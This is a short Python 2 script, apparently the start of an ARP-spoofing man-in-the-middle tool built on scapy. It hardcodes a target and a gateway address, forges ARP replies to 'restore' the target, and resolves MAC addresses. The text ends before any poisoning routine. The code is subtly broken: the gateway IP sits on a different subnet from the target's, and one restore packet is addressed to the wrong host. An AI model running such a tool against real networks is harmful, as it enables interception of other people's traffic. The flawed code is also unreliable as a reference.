#!/usr/bin/python2


from scapy.all import *
import sys
import os
import threading

interface = "en1"
targetIp = "172.16.1.71"
gatewayIp = "172.168.1.254"
packetCount = 1000
poisoning = True

def restoreTarget(gatewayIp, gatewayMac, targetIp, targetMac):
    
    print "[*] Restoring target..."
    send(ARP(op = 2, psrc = gatewayIp, pdst = targetIp, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMac), count = 5)
    send(ARP(op = 2, psrc = targetIp, pdst = targetIp, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = targetMac), count = 5)
    
def getMac(ipAddress):
    responses, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ipAddress), timeout = 2, retry = 10)

    for s,r in responses:
        return r[Ether].src

    return None
